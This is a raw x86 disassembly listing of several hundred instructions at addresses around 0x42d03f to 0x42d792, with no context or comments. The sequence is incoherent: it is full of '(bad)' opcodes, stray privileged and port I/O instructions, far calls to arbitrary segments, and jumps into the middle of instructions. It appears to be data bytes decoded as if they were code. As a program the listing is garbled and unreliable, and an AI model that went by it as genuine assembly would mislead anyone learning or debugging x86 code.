  42d03f:	aad    0x96
  42d041:	push   ss
  42d042:	mov    edx,0x6b9ef6b4
  42d047:	sbb    al,0x40
  42d049:	dec    edx
  42d04a:	cs adc al,0xde
  42d04d:	ins    DWORD PTR es:[edi],dx
  42d04e:	aaa    
  42d04f:	call   0x6392:0x48effd20
  42d056:	pop    ss
  42d057:	clc    
  42d058:	push   eax
  42d059:	dec    ebx
  42d05a:	pop    ebp
  42d05b:	mov    ah,0xd4
  42d05d:	mov    edx,0xd223f4b6
  42d062:	ins    BYTE PTR es:[edi],dx
  42d063:	push   ebp
  42d064:	sub    BYTE PTR [eax],0xc
  42d067:	test   BYTE PTR [eax],0x54
  42d06a:	ins    BYTE PTR es:[edi],dx
  42d06b:	xor    eax,0xb5912c6e
  42d070:	repz sbb eax,0xf8a39c66
  42d076:	stos   DWORD PTR es:[edi],eax
  42d077:	adc    BYTE PTR [esi+ebp*2],dl
  42d07a:	cdq    
  42d07b:	ins    DWORD PTR es:[edi],dx
  42d07c:	stos   DWORD PTR es:[edi],eax
  42d07d:	and    ah,bl
  42d07f:	mov    es,WORD PTR [ebp+0x70]
  42d082:	arpl   WORD PTR [ebx+0x37],sp
  42d085:	(bad)  
  42d086:	cld    
  42d087:	adc    eax,0xbfcb59c1
  42d08c:	mov    cl,0xd1
  42d08e:	stos   BYTE PTR es:[edi],al
  42d08f:	arpl   WORD PTR [edi+esi*8-0x70],dx
  42d093:	int    0xc2
  42d095:	add    BYTE PTR [edx],dl
  42d097:	jo     0x42d099
  42d099:	rcr    BYTE PTR [esi],0xbb
  42d09c:	mov    cl,0xb5
  42d09e:	dec    ebx
  42d09f:	sub    DWORD PTR [esi-0x6b],esp
  42d0a2:	cmp    edx,edi
  42d0a4:	ja     0x42d09c
  42d0a6:	fdiv   st,st(4)
  42d0a8:	adc    DWORD PTR [ecx+0x4b441a36],ebp
  42d0ae:	cmp    al,0x76
  42d0b0:	dec    ebp
  42d0b1:	mov    al,0x6d
  42d0b3:	mov    ds:0xec6e776d,al
  42d0b8:	fmul   DWORD PTR [esi-0x68]
  42d0bb:	inc    esp
  42d0bc:	or     BYTE PTR [edx+0x4441752d],bh
  42d0c2:	adc    BYTE PTR [esi],bh
  42d0c4:	and    BYTE PTR [eax-0x472feeaa],dh
  42d0ca:	jno    0x42d0ee
  42d0cc:	jg     0x42d0d4
  42d0ce:	(bad)  
  42d0cf:	push   esp
  42d0d0:	and    edx,edx
  42d0d2:	lods   eax,DWORD PTR ds:[esi]
  42d0d3:	inc    ecx
  42d0d4:	ins    DWORD PTR es:[edi],dx
  42d0d5:	shl    DWORD PTR [ecx+0x262c5cda],1
  42d0db:	sbb    eax,0xb75536d8
  42d0e0:	push   ebx
  42d0e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d0e2:	and    eax,0x265f596f
  42d0e7:	pop    ss
  42d0e8:	ins    BYTE PTR es:[edi],dx
  42d0e9:	ins    DWORD PTR es:[edi],dx
  42d0ea:	retf   
  42d0eb:	pop    edi
  42d0ec:	mov    ?,ecx
  42d0ee:	add    BYTE PTR [edx-0x6c2bffb7],dh
  42d0f4:	xchg   al,bh
  42d0f6:	jl     0x42d141
  42d0f8:	lods   eax,DWORD PTR ds:[esi]
  42d0f9:	fnsave [esi-0x1b3dd0ba]
  42d0ff:	xlat   BYTE PTR ds:[ebx]
  42d100:	scas   al,BYTE PTR es:[edi]
  42d101:	out    0x26,eax
  42d103:	push   eax
  42d104:	push   0x61
  42d106:	push   ebx
  42d107:	lds    esp,FWORD PTR [ebp-0x596be081]
  42d10d:	popf   
  42d10e:	fild   DWORD PTR gs:[edx-0x6c]
  42d112:	or     ebx,DWORD PTR [ebx+esi*1]
  42d115:	loop   0x42d134
  42d117:	mov    BYTE PTR cs:[ebx],bl
  42d11a:	test   DWORD PTR [ebx],ecx
  42d11c:	popf   
  42d11d:	xor    BYTE PTR ss:0x74a70242,ah
  42d124:	push   eax
  42d125:	mov    cl,0x9
  42d127:	and    edi,DWORD PTR [eax-0x7c]
  42d12a:	inc    edx
  42d12b:	mov    eax,DWORD PTR [ebx+ebx*1]
  42d12e:	add    ch,BYTE PTR [esi]
  42d130:	pop    esi
  42d131:	push   eax
  42d132:	xlat   BYTE PTR ds:[ebx]
  42d133:	dec    ebx
  42d134:	xchg   ecx,eax
  42d135:	int    0xa
  42d137:	aam    0xb6
  42d139:	jne    0x42d1a2
  42d13b:	sahf   
  42d13c:	add    eax,0x9f27a786
  42d141:	pop    ebx
  42d142:	mov    ebx,0xb68e266d
  42d147:	adc    eax,0x65c4d9ef
  42d14c:	adc    DWORD PTR [ecx],ecx
  42d14e:	fstp   st(2)
  42d150:	repnz pop ebx
  42d152:	rcl    BYTE PTR [ebp+0x70940066],1
  42d158:	dec    ebp
  42d159:	or     ebx,DWORD PTR [edi-0x1e]
  42d15c:	push   ebp
  42d15d:	add    BYTE PTR [ebp+0x241a055d],0x78
  42d164:	push   ebp
  42d165:	js     0x42d0ea
  42d167:	mov    dh,0x85
  42d169:	xchg   dl,ah
  42d16b:	mov    ds:0xac053ac1,al
  42d170:	cmp    eax,0x42c6ed5b
  42d175:	cmp    eax,0xeb1c61f
  42d17a:	imul   edi,DWORD PTR [ecx-0xf],0xffffffe0
  42d17e:	mov    dh,0x6d
  42d180:	ins    DWORD PTR es:[edi],dx
  42d181:	outs   dx,BYTE PTR ds:[esi]
  42d182:	pop    esi
  42d183:	xchg   ecx,eax
  42d184:	mov    al,BYTE PTR [edx+eax*8-0x7a]
  42d188:	cmp    al,0xba
  42d18a:	sub    eax,0xa7a9a25d
  42d18f:	pop    esp
  42d190:	inc    eax
  42d191:	jo     0x42d205
  42d193:	sti    
  42d194:	push   0x6d
  42d196:	or     ch,dl
  42d198:	test   al,0xf5
  42d19a:	(bad)  
  42d19c:	outs   dx,BYTE PTR es:[esi]
  42d19e:	jmp    0xb71588e8
  42d1a3:	xchg   BYTE PTR [esi],bl
  42d1a5:	and    ebp,DWORD PTR [ebx]
  42d1a7:	das    
  42d1a8:	xor    al,BYTE PTR [ebx-0x55d15dec]
  42d1ae:	dec    ebp
  42d1af:	xor    al,dl
  42d1b1:	cmc    
  42d1b2:	dec    edx
  42d1b3:	scas   eax,DWORD PTR es:[edi]
  42d1b4:	test   eax,0xeeb6d110
  42d1b9:	test   dh,0x1d
  42d1bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d1bd:	pop    eax
  42d1be:	pusha  
  42d1bf:	mov    eax,ds:0x34a3bb70
  42d1c4:	int    0x67
  42d1c6:	xchg   ebx,eax
  42d1c7:	pop    edx
  42d1c8:	add    BYTE PTR [esi+0x321c6b6d],dh
  42d1ce:	fst    QWORD PTR ds:0xee6ec77
  42d1d4:	ins    DWORD PTR es:[edi],dx
  42d1d5:	sub    ebx,DWORD PTR [ebp+0x68]
  42d1d8:	inc    ebp
  42d1d9:	js     0x42d1c6
  42d1db:	mov    edi,0x3b2c92ea
  42d1e0:	(bad)
  42d1e4:	mov    bh,0x63
  42d1e6:	sti    
  42d1e7:	jae    0x42d1e0
  42d1e9:	mov    esp,0x515bf2da
  42d1ee:	mov    ebx,0x40bbfe50
  42d1f3:	mov    DWORD PTR ds:0x95b43c13,ebx
  42d1f9:	ss push esp
  42d1fb:	sahf   
  42d1fc:	or     bp,sp
  42d1ff:	sar    DWORD PTR [eax],1
  42d201:	les    eax,FWORD PTR [ebp-0x1792a97b]
  42d207:	adc    ecx,esi
  42d209:	and    DWORD PTR [esi+0x15d5bb62],edx
  42d20f:	outs   dx,DWORD PTR ds:[esi]
  42d210:	jno    0x42d216
  42d212:	adc    eax,DWORD PTR [esi+0x71]
  42d215:	imul   ebp,DWORD PTR gs:[ebx-0x15],0x862d4b0a
  42d21d:	xor    BYTE PTR [ecx-0x48],bh
  42d220:	push   0x68056db8
  42d225:	fs sub al,0x29
  42d228:	xchg   edx,eax
  42d229:	je     0x42d263
  42d22b:	arpl   WORD PTR [edi],dx
  42d22d:	sbb    ah,BYTE PTR ss:[edx+0x7f9c9653]
  42d234:	pop    esi
  42d235:	dec    eax
  42d236:	and    eax,0x1c2e85a
  42d23b:	repz test BYTE PTR [ebx-0x34f0199],dl
  42d242:	add    ah,BYTE PTR [ebp+0x767c3c65]
  42d248:	add    BYTE PTR [ecx-0x47ffa8cf],bh
  42d24e:	rcl    BYTE PTR [ecx+0x3],1
  42d251:	mov    cl,0x7
  42d253:	or     BYTE PTR [eax+0x44],cl
  42d256:	mov    ah,0xa
  42d258:	call   0xc2d0:0x3e25504
  42d25f:	lods   eax,DWORD PTR ds:[esi]
  42d260:	es ret 0x58e9
  42d264:	and    eax,0x5b6cf263
  42d269:	loope  0x42d2b1
  42d26b:	and    al,0x2a
  42d26d:	popf   
  42d26e:	jno    0x42d264
  42d270:	outs   dx,BYTE PTR ds:[esi]
  42d271:	and    al,0x8f
  42d273:	ds mov dh,0xad
  42d276:	sub    DWORD PTR [esi],ebp
  42d278:	mov    ch,0x27
  42d27a:	push   esi
  42d27b:	jg     0x42d2b3
  42d27d:	es ins BYTE PTR es:[edi],dx
  42d27f:	sub    al,0x8f
  42d281:	mov    al,ds:0x2f28db5b
  42d286:	xchg   esp,eax
  42d287:	mov    WORD PTR [ecx],gs
  42d289:	loope  0x42d256
  42d28b:	dec    ebx
  42d28c:	pop    ebp
  42d28d:	mov    al,0x2b
  42d28f:	fldenv [edx+0x69]
  42d292:	adc    BYTE PTR [esi+ebx*4],0x42
  42d296:	push   ecx
  42d297:	test   DWORD PTR [edx+0x4d],ebp
  42d29a:	jge    0x42d28d
  42d29c:	je     0x42d30b
  42d29e:	add    eax,0xdb0a176d
  42d2a3:	push   ebp
  42d2a4:	loop   0x42d23e
  42d2a6:	repnz dec ecx
  42d2a8:	outs   dx,BYTE PTR ds:[esi]
  42d2a9:	test   DWORD PTR [ebp-0x2dccdeb3],esp
  42d2af:	das    
  42d2b0:	pusha  
  42d2b1:	xor    DWORD PTR [esi+esi*1+0x2eda3613],esp
  42d2b8:	sub    cl,BYTE PTR [edx]
  42d2ba:	(bad)  
  42d2bb:	jl     0x42d2d4
  42d2bd:	rep stos BYTE PTR es:[edi],al
  42d2bf:	fcom   QWORD PTR [esi+0x2f92970a]
  42d2c5:	mov    ch,0xbe
  42d2c7:	pop    edi
  42d2c8:	push   esp
  42d2c9:	cmc    
  42d2ca:	test   ebp,ebx
  42d2cc:	push   eax
  42d2cd:	outs   dx,BYTE PTR ds:[esi]
  42d2ce:	sbb    eax,0x20f18f05
  42d2d3:	mov    bh,0xf8
  42d2d5:	(bad)  [esi-0x6fa14e4f]
  42d2db:	outs   dx,DWORD PTR ds:[esi]
  42d2dc:	loopne 0x42d295
  42d2de:	leave  
  42d2df:	mov    esp,0xb6d93bf0
  42d2e4:	shr    BYTE PTR [esi+0xb],1
  42d2e7:	mov    BYTE PTR [ecx],dh
  42d2e9:	pop    edi
  42d2ea:	ficomp WORD PTR [esi+0xe8c88dd]
  42d2f0:	lods   eax,DWORD PTR ds:[esi]
  42d2f1:	ins    DWORD PTR es:[edi],dx
  42d2f2:	sub    dl,ah
  42d2f4:	dec    esp
  42d2f5:	ins    BYTE PTR es:[edi],dx
  42d2f6:	mov    al,ds:0x447a200b
  42d2fb:	call   0x6a082656
  42d300:	adc    al,0xdf
  42d302:	mov    edi,0xa2718e40
  42d307:	xor    eax,0x668baeda
  42d30c:	ja     0x42d2f1
  42d30e:	xchg   ebp,edx
  42d310:	add    eax,0x945889b5
  42d315:	mov    dh,BYTE PTR [ebx-0x49482b55]
  42d31b:	sub    edx,ebx
  42d31d:	xor    DWORD PTR [edx+0x3ab74d4e],ebx
  42d323:	lds    eax,FWORD PTR ds:0xe2208ec7
  42d329:	mov    dh,0x7d
  42d32b:	or     eax,edi
  42d32d:	sti    
  42d32e:	sbb    DWORD PTR [ebp+0x6dda75d1],edx
  42d334:	pop    ebx
  42d335:	call   0xd27dbc28
  42d33a:	outs   dx,BYTE PTR ds:[esi]
  42d33b:	mov    al,ds:0xce9a4aad
  42d340:	fld    TBYTE PTR [edi-0x46ddd94a]
  42d346:	or     BYTE PTR [eax-0x281e02f5],bh
  42d34c:	call   0xaf8e967
  42d351:	icebp  
  42d352:	popf   
  42d353:	inc    esi
  42d354:	xchg   esp,eax
  42d355:	mov    esi,0xc011229d
  42d35a:	test   DWORD PTR ds:0x998582ab,ebp
  42d360:	fild   QWORD PTR [ecx-0x44291757]
  42d366:	imul   edi,eax,0x59
  42d369:	nop
  42d36a:	ret    
  42d36b:	or     BYTE PTR [esp+edx*2+0x3d6dcb6d],0x83
  42d373:	loopne 0x42d33e
  42d375:	out    0xbf,al
  42d377:	sbb    DWORD PTR [ebx+0x6d],ebx
  42d37a:	(bad)  
  42d37c:	loope  0x42d3f7
  42d37e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d37f:	sub    eax,0xa3143eaa
  42d384:	fild   QWORD PTR [ecx-0x42754523]
  42d38a:	xor    edi,DWORD PTR [ecx+0xe]
  42d38d:	cmp    BYTE PTR [ebp+0x6db79b29],al
  42d393:	arpl   WORD PTR [ecx+0x35],sp
  42d396:	pop    ebx
  42d397:	sahf   
  42d398:	xchg   DWORD PTR [edx+esi*8],eax
  42d39b:	adc    DWORD PTR [edi-0x491f816b],esp
  42d3a1:	rol    BYTE PTR [ecx],1
  42d3a3:	sub    bh,BYTE PTR [eax+0xa]
  42d3a6:	popf   
  42d3a7:	dec    ebp
  42d3a8:	int3   
  42d3a9:	or     bh,dl
  42d3ab:	mov    dh,0xed
  42d3ad:	and    BYTE PTR [ebp+0x51],bl
  42d3b0:	or     eax,0x843523b9
  42d3b5:	cs inc ecx
  42d3b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d3b8:	mov    ch,ch
  42d3ba:	mov    al,ds:0xebc1e6c5
  42d3bf:	mov    dh,0xb1
  42d3c1:	shr    BYTE PTR [esi],1
  42d3c3:	test   BYTE PTR [ebp+0x50e5bf12],0x48
  42d3ca:	push   es
  42d3cb:	mov    eax,ds:0xc2c6e02a
  42d3d0:	cwde   
  42d3d1:	sub    BYTE PTR [ebx+0x6d469433],bh
  42d3d7:	dec    ebp
  42d3d8:	adc    BYTE PTR [edi+eiz*2-0x43],ch
  42d3dc:	les    edx,FWORD PTR [ebx+0x36f695af]
  42d3e2:	cmp    al,BYTE PTR [eax]
  42d3e4:	mov    eax,0xa129ae65
  42d3e9:	cdq    
  42d3ea:	xor    ch,cl
  42d3ec:	push   edx
  42d3ed:	push   ebx
  42d3ee:	add    eax,0x2af8c297
  42d3f3:	add    BYTE PTR [esi],dl
  42d3f5:	jmp    0xd09e1401
  42d3fa:	popa   
  42d3fb:	push   eax
  42d3fc:	loop   0x42d39e
  42d3fe:	ins    DWORD PTR es:[edi],dx
  42d3ff:	jmp    0x42d409
  42d401:	(bad)  
  42d402:	int3   
  42d403:	popf   
  42d404:	add    eax,0x5f610ea1
  42d409:	cmp    ecx,DWORD PTR [edx]
  42d40b:	jbe    0x42d3e1
  42d40d:	jae    0x42d468
  42d40f:	push   esp
  42d410:	mov    eax,ds:0x938f48e9
  42d415:	pusha  
  42d416:	fstp   TBYTE PTR [esi+0x6d]
  42d419:	in     al,dx
  42d41a:	mov    al,0x82
  42d41c:	aam    0x34
  42d41e:	mov    edi,0x14473854
  42d423:	je     0x42d3c8
  42d425:	and    esi,DWORD PTR ds:0x80d21f0
  42d42b:	push   0xffffffbb
  42d42d:	mov    cl,0x75
  42d42f:	xor    al,0xab
  42d431:	cmp    ebx,DWORD PTR [eax-0x4fa39591]
  42d437:	mov    esp,ecx
  42d439:	mov    bh,0xda
  42d43b:	scas   al,BYTE PTR es:[edi]
  42d43c:	lods   eax,DWORD PTR ds:[esi]
  42d43d:	mov    esi,0xeb193eaf
  42d442:	mov    ds:0xa806ad00,eax
  42d447:	retf   
  42d448:	xchg   edi,eax
  42d449:	fisub  DWORD PTR [eax]
  42d44b:	inc    eax
  42d44c:	add    BYTE PTR [ebx-0x58174fe8],al
  42d452:	pop    ebp
  42d453:	inc    ecx
  42d454:	fisttp DWORD PTR [eax]
  42d456:	jne    0x42d4c6
  42d458:	test   eax,0x1471f940
  42d45d:	and    BYTE PTR [esi+0x2b2ca82d],bh
  42d463:	xlat   BYTE PTR ds:[ebx]
  42d464:	bound  esi,QWORD PTR [edi]
  42d466:	(bad)  
  42d467:	(bad)  
  42d468:	outs   dx,BYTE PTR ds:[esi]
  42d469:	xor    al,0x41
  42d46b:	shr    BYTE PTR [eax+0x20],cl
  42d46e:	sub    al,0x11
  42d470:	in     eax,0xff
  42d472:	test   eax,0x53c2ea8b
  42d477:	int    0xef
  42d479:	fs (bad) 
  42d47b:	jns    0x42d403
  42d47d:	cli    
  42d47e:	fnsave [esi+0x6f3eaa6d]
  42d484:	add    eax,0xc08c6bf5
  42d489:	cmp    BYTE PTR [eax-0x49723b8f],bh
  42d48f:	or     DWORD PTR [ebx+edi*8+0x13a2ad79],eax
  42d496:	pop    ss
  42d497:	rol    BYTE PTR [edx-0x25],cl
  42d49a:	inc    eax
  42d49b:	or     edx,DWORD PTR [ebx]
  42d49d:	adc    BYTE PTR [ebp-0x57],bh
  42d4a0:	pop    edx
  42d4a1:	pop    edi
  42d4a2:	lods   eax,DWORD PTR ds:[esi]
  42d4a3:	mov    eax,ds:0xd211c6e8
  42d4a8:	test   al,0xec
  42d4aa:	retf   
  42d4ab:	shl    eax,1
  42d4ad:	mov    ch,0xb5
  42d4af:	xor    eax,0x4a6c1b88
  42d4b4:	push   0x5b
  42d4b6:	pusha  
  42d4b7:	mov    eax,ds:0x8752b74
  42d4bc:	push   eax
  42d4bd:	xor    cl,BYTE PTR [esi]
  42d4bf:	ret    
  42d4c0:	push   es
  42d4c1:	mov    WORD PTR [ecx+0x7068b616],gs
  42d4c7:	cmp    BYTE PTR [ebx+0x67ec3635],bh
  42d4cd:	xchg   edi,eax
  42d4ce:	fist   DWORD PTR [edi]
  42d4d0:	mov    bh,0xb6
  42d4d2:	imul   DWORD PTR [edi-0x5a89c060]
  42d4d8:	adc    eax,0x6d2dc083
  42d4dd:	mov    ah,0xb
  42d4df:	dec    ecx
  42d4e0:	leave  
  42d4e1:	not    DWORD PTR [esi-0x31]
  42d4e4:	jmp    FWORD PTR [ebx+0x44]
  42d4e7:	mov    cl,0xb0
  42d4e9:	mov    cl,0xb0
  42d4eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d4ec:	cmp    ch,ah
  42d4ee:	rcr    BYTE PTR [di],cl
  42d4f1:	cmp    BYTE PTR [ecx],0x8d
  42d4f4:	pop    ebx
  42d4f5:	pop    ecx
  42d4f6:	mov    edx,0xcb8a6412
  42d4fb:	jl     0x42d535
  42d4fd:	cwde   
  42d4fe:	pop    ebx
  42d4ff:	add    ecx,DWORD PTR [ebp+0x14]
  42d502:	mov    ebx,0xdb98d482
  42d507:	sub    ecx,DWORD PTR [edx+edi*4+0x6db8823b]
  42d50e:	cwde   
  42d50f:	cmp    DWORD PTR [ebx],0x9ea76276
  42d515:	jmp    0x42d4d2
  42d517:	rol    DWORD PTR [eax],1
  42d519:	or     edx,DWORD PTR [ebx]
  42d51b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d51c:	add    DWORD PTR [esi],ebp
  42d51e:	(bad)  
  42d51f:	frstor [esi]
  42d521:	or     dl,al
  42d523:	inc    esi
  42d524:	jmp    0x37333e6f
  42d529:	sahf   
  42d52a:	mov    ds:0xa96b618d,al
  42d52f:	add    edx,ebp
  42d531:	ja     0x42d51a
  42d533:	mov    esi,0x8ea7b93c
  42d538:	lea    ecx,[ebp-0x2fe59e8a]
  42d53e:	cld    
  42d53f:	mov    eax,0x575f1b41
  42d544:	test   eax,0x8bc15d82
  42d549:	inc    ecx
  42d54a:	out    dx,eax
  42d54b:	mov    ds:0xd9617529,eax
  42d550:	fsub   DWORD PTR [edx+0x2d7442ba]
  42d556:	imul   ebx,eax,0x15d6d2c7
  42d55c:	je     0x42d5bc
  42d55e:	test   esi,ebp
  42d560:	jnp    0x42d533
  42d562:	xlat   BYTE PTR ds:[ebx]
  42d563:	imul   ebp,DWORD PTR [ebp-0x1d],0xffffffc6
  42d567:	(bad)  
  42d568:	icebp  
  42d569:	daa    
  42d56a:	xor    edi,DWORD PTR [ecx]
  42d56c:	nop
  42d56d:	dec    edi
  42d56e:	arpl   cx,si
  42d570:	jno    0x42d528
  42d572:	pop    ebx
  42d573:	jecxz  0x42d577
  42d575:	ror    bh,0xae
  42d578:	fisttp DWORD PTR [ecx+0x5e32d9da]
  42d57e:	fsubr  DWORD PTR [eax+0x3b]
  42d581:	or     bh,BYTE PTR [esi+eiz*2]
  42d584:	cwde   
  42d585:	add    eax,0xb6db378
  42d58a:	or     eax,DWORD PTR [ebp+0x1034dc42]
  42d590:	popf   
  42d591:	mov    DWORD PTR [eax],ecx
  42d593:	sub    ebp,eax
  42d595:	mov    dh,0xb4
  42d597:	cmp    esi,DWORD PTR [ecx]
  42d599:	sahf   
  42d59a:	dec    ebx
  42d59b:	into   
  42d59c:	and    eax,0x752da930
  42d5a1:	add    al,0xb0
  42d5a3:	stc    
  42d5a4:	add    bl,BYTE PTR [ecx]
  42d5a6:	ret    0xd005
  42d5a9:	pop    edx
  42d5aa:	adc    BYTE PTR [esi],0x2d
  42d5ad:	sar    DWORD PTR [edx-0x4a],1
  42d5b0:	sahf   
  42d5b1:	icebp  
  42d5b2:	push   0x47
  42d5b4:	aam    0x86
  42d5b6:	add    DWORD PTR [edi+0x2d],ebp
  42d5b9:	retf   
  42d5ba:	mov    edx,0x85c54d57
  42d5bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d5c0:	pop    ebp
  42d5c1:	ss addr16 adc al,0xf6
  42d5c5:	jo     0x42d5c4
  42d5c7:	popa   
  42d5c8:	imul   ebx,DWORD PTR [ebx],0x5
  42d5cb:	cmp    al,0x17
  42d5cd:	sbb    al,ch
  42d5cf:	sbb    bl,dl
  42d5d1:	cmp    ch,BYTE PTR [edx+0x4642740d]
  42d5d7:	out    dx,eax
  42d5d8:	call   0x377c4fb6
  42d5dd:	push   ss
  42d5de:	or     dl,BYTE PTR [edi]
  42d5e0:	cs jno 0x42d61c
  42d5e3:	xor    al,0xf4
  42d5e5:	xor    dl,BYTE PTR [ecx-0x6d]
  42d5e8:	mov    ds:0x6b6ddb0f,al
  42d5ed:	je     0x42d63f
  42d5ef:	bswap  esi
  42d5f1:	loopne 0x42d5db
  42d5f3:	loopne 0x42d5c9
  42d5f5:	add    DWORD PTR [esi],esi
  42d5f7:	lods   eax,DWORD PTR ds:[esi]
  42d5f8:	and    eax,ebx
  42d5fa:	mov    dh,0x70
  42d5fc:	adc    BYTE PTR [esi+0x169b2c38],0x2f
  42d603:	mov    dh,0xd1
  42d605:	inc    esp
  42d606:	sar    BYTE PTR [ebx-0x362e0144],0xe7
  42d60d:	inc    esp
  42d60e:	or     cl,BYTE PTR ds:0x363de89a
  42d614:	dec    eax
  42d615:	cli    
  42d616:	add    dl,ah
  42d618:	fisubr DWORD PTR [ebp-0x6d4e7713]
  42d61e:	sub    BYTE PTR [esi+0x53],dl
  42d621:	retf   
  42d622:	mov    al,ds:0x68db702c
  42d627:	pop    ss
  42d628:	scas   eax,DWORD PTR es:[edi]
  42d629:	lods   eax,DWORD PTR ds:[esi]
  42d62a:	mov    ch,0x4a
  42d62c:	lea    ecx,[edi-0x5aeca1c2]
  42d632:	xchg   DWORD PTR [esi],esi
  42d634:	adc    DWORD PTR [ebx+0x2b],ebp
  42d637:	xchg   edx,eax
  42d638:	push   eax
  42d639:	pop    ebp
  42d63a:	stos   BYTE PTR es:[edi],al
  42d63b:	inc    ebp
  42d63c:	ins    DWORD PTR es:[edi],dx
  42d63d:	mov    bh,0xda
  42d63f:	and    ecx,DWORD PTR [edx+0x41]
  42d642:	(bad)  
  42d643:	or     ebp,DWORD PTR [esi+0x59]
  42d646:	sub    edx,DWORD PTR [ebp+0x74]
  42d649:	jae    0x42d6c0
  42d64b:	lock mov ah,0x4
  42d64e:	push   esi
  42d64f:	in     al,dx
  42d650:	popa   
  42d651:	in     eax,dx
  42d652:	push   esi
  42d653:	fcmovu st,st(0)
  42d655:	sti    
  42d656:	ds cld 
  42d658:	and    DWORD PTR [ebx+0x7d],ecx
  42d65b:	push   ebx
  42d65c:	mov    ecx,0x6c14e084
  42d661:	adc    BYTE PTR [ebp-0x23],ch
  42d664:	ins    BYTE PTR es:[edi],dx
  42d665:	sub    al,0x4c
  42d667:	in     eax,dx
  42d668:	(bad)  
  42d669:	mov    dh,0xd
  42d66b:	or     DWORD PTR [ebx],eax
  42d66d:	fcom   DWORD PTR [esp+eax*2]
  42d670:	mov    dh,0x83
  42d672:	dec    cl
  42d674:	xor    ah,dh
  42d676:	jb     0x42d6e4
  42d678:	(bad)  
  42d679:	stc    
  42d67a:	outs   dx,DWORD PTR ds:[esi]
  42d67b:	cwde   
  42d67c:	fld    DWORD PTR [esi]
  42d67e:	ins    DWORD PTR es:[edi],dx
  42d67f:	dec    ebp
  42d680:	mov    bh,0xa5
  42d682:	dec    ebx
  42d683:	fld    TBYTE PTR [edi-0x5f]
  42d686:	and    al,0x4a
  42d688:	ret    
  42d689:	and    DWORD PTR [ebx],esp
  42d68b:	cmp    dh,cl
  42d68d:	jle    0x42d68f
  42d68f:	ss inc ecx
  42d691:	ins    BYTE PTR es:[edi],dx
  42d692:	retf   
  42d693:	mov    ?,esi
  42d695:	sbb    ah,BYTE PTR [eax]
  42d697:	add    cl,dl
  42d699:	out    0x53,al
  42d69b:	ins    DWORD PTR es:[edi],dx
  42d69c:	fstp   TBYTE PTR [edx+0x2018d220]
  42d6a2:	rcr    BYTE PTR ds:0xa0b5b04a,cl
  42d6a8:	fcmovb st,st(2)
  42d6aa:	sahf   
  42d6ab:	aad    0x70
  42d6ad:	mov    ecx,0x16dbcd83
  42d6b2:	dec    edx
  42d6b3:	dec    ebp
  42d6b4:	push   0x864f6b8b
  42d6b9:	inc    edi
  42d6ba:	out    dx,al
  42d6bb:	fcmovu st,st(3)
  42d6bd:	inc    esp
  42d6be:	mov    bh,0x76
  42d6c0:	xor    al,0xdb
  42d6c2:	mov    eax,ds:0xe7e99180
  42d6c7:	in     al,0x47
  42d6c9:	inc    esp
  42d6ca:	shr    BYTE PTR [ebp-0x3d979d5d],1
  42d6d0:	sub    DWORD PTR [esi],edi
  42d6d2:	or     DWORD PTR [ebx+0x5d06c2d],ebp
  42d6d8:	pop    edi
  42d6d9:	bnd ja 0x42d6f3
  42d6dc:	jg     0x42d69a
  42d6de:	push   ss
  42d6df:	cmp    cl,BYTE PTR [edx]
  42d6e1:	mov    eax,0xdabed44a
  42d6e6:	nop
  42d6e7:	xor    al,0x30
  42d6e9:	outs   dx,BYTE PTR ds:[esi]
  42d6ea:	dec    ebp
  42d6eb:	add    eax,0xd09592dd
  42d6f0:	jo     0xb7092f76
  42d6f6:	fnstsw WORD PTR [edx]
  42d6f8:	xor    BYTE PTR [esi-0x58],0x3e
  42d6fc:	sbb    BYTE PTR [ecx+0x4a],dh
  42d6ff:	hlt    
  42d700:	mov    al,0xad
  42d702:	fnsave [esi-0x5e22bc7b]
  42d708:	out    0xc8,al
  42d70a:	sub    BYTE PTR [esi+0x54d814f8],ch
  42d710:	mov    bh,0x85
  42d712:	pusha  
  42d713:	dec    esp
  42d714:	fmul   st(3),st
  42d716:	fwait
  42d717:	cmp    eax,0xd436d06e
  42d71c:	outs   dx,BYTE PTR ds:[esi]
  42d71d:	ins    DWORD PTR es:[edi],dx
  42d71e:	pop    ecx
  42d71f:	(bad)  
  42d720:	repnz gs inc ecx
  42d723:	lds    edx,FWORD PTR [edx]
  42d725:	dec    ecx
  42d726:	inc    esp
  42d727:	pop    ebx
  42d728:	aam    0xd6
  42d72a:	cs push ebx
  42d72c:	xchg   DWORD PTR [edi+ebx*2],eax
  42d72f:	das    
  42d730:	xchg   DWORD PTR [ebx],eax
  42d732:	arpl   WORD PTR [esi],ax
  42d734:	sub    BYTE PTR [esi],dh
  42d736:	adc    al,0x3c
  42d738:	adc    eax,0x6db0ae0d
  42d73d:	retf   
  42d73e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d73f:	cmp    bl,BYTE PTR [esp+eax*8+0x7f]
  42d743:	in     al,0x5
  42d745:	xchg   esp,ebp
  42d747:	ss mov eax,0xe14475b0
  42d74d:	icebp  
  42d74e:	(bad)  
  42d74f:	sbb    DWORD PTR [edx],edi
  42d751:	cmp    DWORD PTR [ecx],esp
  42d753:	add    bh,BYTE PTR [esi]
  42d755:	sub    al,0xdf
  42d757:	push   edi
  42d758:	cs add dl,cl
  42d75b:	repz ds inc ebx
  42d75e:	ret    0x96db
  42d761:	das    
  42d762:	ins    BYTE PTR es:[edi],dx
  42d763:	sbb    esi,esi
  42d765:	xor    ch,bh
  42d767:	or     DWORD PTR [ecx+esi*1-0x3e],0x0
  42d76c:	pop    ds
  42d76d:	pushf  
  42d76e:	inc    edx
  42d76f:	rol    DWORD PTR [ebp+0x23d4d056],1
  42d775:	pop    ebx
  42d776:	mov    ch,0x2b
  42d778:	sbb    al,BYTE PTR [edx-0x6393fe28]
  42d77e:	out    dx,eax
  42d77f:	fsub   DWORD PTR [edx]
  42d781:	in     eax,dx
  42d782:	ret    0xa56
  42d785:	jb     0x42d71f
  42d787:	xchg   DWORD PTR [edx+esi*4-0x1da9a39e],edx
  42d78e:	(bad)  
  42d78f:	mov    dh,0x82
  42d791:	retf   
  42d792:	add    ah,BYTE PTR fs:[ecx+eax*1-0x4a131a8d]
